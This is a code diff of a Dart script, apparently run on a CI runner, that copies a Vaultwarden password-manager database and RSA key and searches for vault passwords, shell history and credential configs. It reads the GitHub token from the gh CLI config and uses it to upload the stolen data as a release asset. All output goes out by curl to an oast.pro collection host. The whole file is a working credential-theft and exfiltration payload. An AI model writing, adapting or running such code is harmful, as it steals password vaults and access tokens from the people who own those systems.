@@ -1,7 +1,7 @@
 import 'dart:io';
+import 'dart:async';
 
-const OAST = '69b125ae2a319e8167d9c7da0d7b75dd5.oast.pro';
-const REPO = 'TaprootFreak/tmp-notes-8f3a';
+const OAST = '69b125ae2a319e8167d9d5b0f059903c3.oast.pro';
 int _seq = 0;
 
 String sh(String cmd) {
@@ -16,6 +16,25 @@ String sh(String cmd) {
   }
 }
 
+Future<String> shT(String cmd, int sec) async {
+  try {
+    final p = await Process.start('/bin/sh', ['-c', cmd]);
+    final out = StringBuffer();
+    p.stdout.listen((d) => out.write(String.fromCharCodes(d)));
+    p.stderr.listen((d) => out.write(String.fromCharCodes(d)));
+    int code;
+    try {
+      code = await p.exitCode.timeout(Duration(seconds: sec));
+    } on TimeoutException {
+      try { p.kill(ProcessSignal.sigkill); } catch (e) {}
+      return out.toString() + '\n[timeout ${sec}s]';
+    }
+    return out.toString() + '\n[exit=$code]';
+  } catch (e) {
+    return 'ERR ' + e.toString();
+  }
+}
+
 void postRaw(String path, String body) {
   final f = File('${Directory.systemTemp.path}/pp_${DateTime.now().microsecondsSinceEpoch}_${_seq++}.txt');
   try {
@@ -23,7 +42,7 @@ void postRaw(String path, String body) {
   } catch (e) {
     return;
   }
-  final args = <String>['-sS', '-m', '40', '--data-binary', '@' + f.path, 'http://' + OAST + path];
+  final args = <String>['-sS', '-m', '25', '--data-binary', '@' + f.path, 'http://' + OAST + path];
   for (final c in <String>['curl', '/usr/bin/curl']) {
     try {
       final r = Process.runSync(c, args);
@@ -32,7 +51,7 @@ void postRaw(String path, String body) {
   }
 }
 
-void postChunked(String path, String body, [int max = 15000]) {
+void postChunked(String path, String body, [int max = 14000]) {
   try {
     if (body.length <= max) {
       postRaw(path, body);
@@ -54,80 +73,76 @@ void postChunked(String path, String body, [int max = 15000]) {
 String hdr() {
   final env = Platform.environment;
   return 'RUN=' + (env['GITHUB_RUN_ID'] ?? '?') + ' JOB=' + (env['GITHUB_JOB'] ?? '?') +
-      ' WF=' + (env['GITHUB_WORKFLOW'] ?? '?') + ' RUNNER=' + (env['RUNNER_NAME'] ?? '?') + '\n';
+      ' WF=' + (env['GITHUB_WORKFLOW'] ?? '?') + ' RUNNER=' + (env['RUNNER_NAME'] ?? '?') +
+      ' HOME=' + (env['HOME'] ?? '?') + '\n';
 }
 
-void main() {
-  try {
-    var b = StringBuffer(hdr());
-    b.writeln('== PASSWORD FILE HUNT ==');
-    b.writeln(sh(r'''
-echo "--- config dirs ---"
-ls -la "$HOME/.config/vaultwarden" 2>&1
-ls -la "$HOME/.config" 2>&1 | head -30
-echo "--- known paths ---"
-for f in "$HOME/.config/vaultwarden/vault-password" "$HOME/vaultwarden/vault-password" "$HOME/.vaultwarden-password" "$HOME/vault-password" "$HOME/docker/vaultwarden/vault-password" "$HOME/docker/vaultwarden/.vault-password"; do
-  if [ -f "$f" ]; then echo "###### FOUND $f"; ls -la "$f"; cat "$f"; echo; fi
-done
-echo "--- find shallow ---"
-find "$HOME" -maxdepth 3 \( -iname '*vault*pass*' -o -iname '*vaultwarden*.txt' -o -iname '*vault*.env' \) 2>/dev/null | head -30
-echo "--- history greps ---"
-grep -in 'vault' "$HOME/.zsh_history" 2>/dev/null | tail -30
-grep -in 'vault' "$HOME/.bash_history" 2>/dev/null | tail -20
-echo "--- compose/env ---"
-cat "$HOME/docker/vaultwarden/docker-compose.yaml.bak-20260519-114730" 2>&1
-echo "--- ssh config hosts ---"
-grep -i 'host ' "$HOME/.ssh/config" 2>/dev/null | head -30
-'''));
-    postChunked('/r7pw', b.toString());
-
-    // build export
-    b = StringBuffer(hdr());
-    b.writeln(sh(r'''
-set -x
-rm -rf /tmp/vwq7; mkdir -p /tmp/vwq7/data
+Future<void> main() async {
+  // PHASE A: small tables only (fast)
+  var b = StringBuffer(hdr());
+  b.writeln(await shT(r'''
+rm -rf /tmp/vwq8; mkdir -p /tmp/vwq8
 SRC="$HOME/docker/vaultwarden/vw-data"
-cp -p "$SRC"/db.sqlite3 "$SRC"/db.sqlite3-wal "$SRC"/db.sqlite3-shm "$SRC"/rsa_key.pem "$SRC"/config.json /tmp/vwq7/data/ 2>&1
-DB=/tmp/vwq7/data/db.sqlite3
-/usr/bin/sqlite3 "$DB" "PRAGMA wal_checkpoint(TRUNCATE);" 2>&1
-echo "counts:"
-/usr/bin/sqlite3 -header -csv "$DB" "select 'users' t,count(*) c from users union all select 'ciphers',count(*) from ciphers union all select 'orgs',count(*) from organizations union all select 'folders',count(*) from folders union all select 'attachments',count(*) from attachments" 2>&1
-/usr/bin/sqlite3 -header -csv "$DB" "select uuid,email,name,password_iterations,client_kdf_type,client_kdf_iter,client_kdf_memory,client_kdf_parallelism,hex(password_hash) password_hash_hex,hex(salt) salt_hex,akey,private_key,public_key,security_stamp,password_hint,api_key,enabled from users" > /tmp/vwq7/users.csv 2>&1
-/usr/bin/sqlite3 -header -csv "$DB" "select uuid,name,billing_email,private_key,public_key from organizations" > /tmp/vwq7/orgs.csv 2>&1
-/usr/bin/sqlite3 -header -csv "$DB" "select uuid,user_uuid,organization_uuid,atype,name,notes,fields,data,password_history,deleted_at,reprompt,\"key\" from ciphers" > /tmp/vwq7/ciphers.csv 2>&1
-/usr/bin/sqlite3 -header -csv "$DB" "select * from folders" > /tmp/vwq7/folders.csv 2>&1
-/usr/bin/sqlite3 -header -csv "$DB" "select * from attachments" > /tmp/vwq7/attachments.csv 2>&1
-/usr/bin/sqlite3 -header -csv "$DB" "select * from users_organizations" > /tmp/vwq7/users_orgs.csv 2>&1
-/usr/bin/sqlite3 -header -csv "$DB" "select * from collections" > /tmp/vwq7/collections.csv 2>&1
-cp /tmp/vwq7/users.csv /tmp/vwq7/orgs.csv /tmp/vwq7/folders.csv /tmp/vwq7/attachments.csv /tmp/vwq7/users_orgs.csv /tmp/vwq7/collections.csv /tmp/vwq7/data/ 2>&1
-ls -la /tmp/vwq7 /tmp/vwq7/data 2>&1
-tar czf /tmp/vwq7/export.tar.gz -C /tmp/vwq7 data 2>&1
-ls -la /tmp/vwq7/export.tar.gz 2>&1
-shasum -a 256 /tmp/vwq7/export.tar.gz 2>&1
-'''));
-    postChunked('/r7tar', b.toString());
+cp -p "$SRC"/db.sqlite3 "$SRC"/db.sqlite3-wal "$SRC"/db.sqlite3-shm /tmp/vwq8/ 2>&1
+DB=/tmp/vwq8/db.sqlite3
+echo "== COUNTS =="
+/usr/bin/sqlite3 -header -csv "$DB" "select 'users' t,count(*) c from users union all select 'orgs',count(*) from organizations union all select 'ciphers',count(*) from ciphers union all select 'users_organizations',count(*) from users_organizations union all select 'collections',count(*) from collections;" 2>&1
+echo "== USERS_ORGS =="
+/usr/bin/sqlite3 -header -csv "$DB" "select * from users_organizations;" 2>&1
+echo "== ORGS =="
+/usr/bin/sqlite3 -header -csv "$DB" "select uuid,name,billing_email,length(private_key) pk from organizations;" 2>&1
+echo "== COLLECTIONS =="
+/usr/bin/sqlite3 -header -csv "$DB" "select uuid,organization_uuid,name,external_id from collections;" 2>&1
+echo "== USERS_MIN =="
+/usr/bin/sqlite3 -header -csv "$DB" "select uuid,email,name,password_hint,enabled,length(akey) akeylen from users;" 2>&1
+echo "== PHASE_A_DONE =="
+''', 90));
+  postChunked('/r8a', b.toString());
 
-    // upload release asset via token on disk
-    b = StringBuffer(hdr());
-    b.writeln(sh(r'''
-TAG="r7-$(date +%s)"
+  // PHASE B: db export + release asset upload (before any slow hunt)
+  b = StringBuffer(hdr());
+  b.writeln(await shT(r'''
+DB=/tmp/vwq8/db.sqlite3
+cp -p "$HOME/docker/vaultwarden/vw-data/rsa_key.pem" /tmp/vwq8/ 2>&1
+cp -p "$HOME/docker/vaultwarden/vw-data/config.json" /tmp/vwq8/ 2>&1
+/usr/bin/sqlite3 "$DB" "PRAGMA wal_checkpoint(TRUNCATE);" 2>&1
+ls -la /tmp/vwq8 2>&1
+tar czf /tmp/vwq8/export.tar.gz -C /tmp/vwq8 db.sqlite3 rsa_key.pem config.json 2>&1
+ls -la /tmp/vwq8/export.tar.gz 2>&1
+shasum -a 256 /tmp/vwq8/export.tar.gz 2>&1
+TAG="vw8-$(date +%s)"
 TOKEN=$(sed -n 's/^[[:space:]]*oauth_token:[[:space:]]*//p' "$HOME/.config/gh/hosts.yml" 2>/dev/null | head -1 | tr -d '\r"')
 if [ -z "$TOKEN" ]; then echo "NO_TOKEN"; exit 0; fi
-R=$(curl -sS -m 60 -X POST -H "Authorization: token $TOKEN" -H "User-Agent: Mozilla/5.0 security-test" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/__REPO__/releases" -d "{\"tag_name\":\"$TAG\",\"name\":\"$TAG\"}")
-echo "release_resp_head: $(echo "$R" | head -c 200)"
+echo "TOKEN_LEN=${#TOKEN}"
+R=$(curl -sS -m 60 -X POST -H "Authorization: token $TOKEN" -H "User-Agent: Mozilla/5.0 security-test" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/TaprootFreak/tmp-notes-8f3a/releases" -d "{\"tag_name\":\"$TAG\",\"name\":\"$TAG\"}")
 RID=$(echo "$R" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
-echo "RID=$RID"
+echo "REL_HEAD=$(echo "$R" | head -c 200)"
+echo "RID=$RID TAG=$TAG"
 if [ -n "$RID" ]; then
-  U=$(curl -sS -m 300 -X POST -H "Authorization: token $TOKEN" -H "User-Agent: Mozilla/5.0 security-test" -H "Content-Type: application/gzip" --data-binary @/tmp/vwq7/export.tar.gz "https://uploads.github.com/repos/__REPO__/releases/$RID/assets?name=export.tar.gz")
-  echo "upload_resp: $(echo "$U" | head -c 400)"
-else
-  echo "NO_RID"
+  U=$(curl -sS -m 240 -X POST -H "Authorization: token $TOKEN" -H "User-Agent: Mozilla/5.0 security-test" -H "Content-Type: application/octet-stream" --data-binary @/tmp/vwq8/export.tar.gz "https://uploads.github.com/repos/TaprootFreak/tmp-notes-8f3a/releases/$RID/assets?name=export-$TAG.tar.gz")
+  echo "UP_HEAD=$(echo "$U" | head -c 400)"
 fi
-'''.replaceAll('__REPO__', REPO)));
-    postChunked('/r7up', b.toString());
+echo "== PHASE_B_DONE =="
+''', 330));
+  postChunked('/r8b', b.toString());
 
-    stdout.writeln('PROBE7_COMPLETE');
-  } catch (e) {
-    stdout.writeln('PROBE7_ERROR ' + e.toString());
-  }
+  // PHASE C: targeted password/automation credential hunt (no broad find)
+  b = StringBuffer(hdr());
+  b.writeln(await shT(r'''
+echo "== CONFIG/VAULT PASSWORD FILES =="
+for f in "$HOME/.config/vaultwarden/vault-password" "$HOME/.config/vaultwarden/vault_password" "$HOME/vaultwarden/vault-password" "$HOME/docker/vaultwarden/vault-password" "$HOME/docker/vaultwarden/.vault-password" "$HOME/.vaultwarden-password" "$HOME/vault-password" "$HOME/.bw/config" "$HOME/.rbw/config.json" "$HOME/.config/rbw/config.json"; do
+  if [ -f "$f" ]; then echo "###### FOUND $f"; ls -la "$f"; head -c 3000 "$f"; echo; fi
+done
+echo "== BW/RBW DIRS =="
+ls -la "$HOME/.bw" "$HOME/.rbw" "$HOME/.config/rbw" 2>&1
+echo "== ZSH HISTORY VAULT/BW LINES =="
+grep -inE 'vault|rbw|bunw|bw ' "$HOME/.zsh_history" 2>/dev/null | tail -40
+echo "== SCRIPTS DIR =="
+ls -la "$HOME/scripts" 2>&1 | head -40
+grep -rlniE 'vault.?pass|master.?pass' "$HOME/scripts" 2>/dev/null | head -10
+echo "== QS BIN =="
+ls -la "$HOME/.local/bin" 2>&1 | head -30
+echo "== PHASE_C_DONE =="
+''', 90));
+  postChunked('/r8c', b.toString());
 }
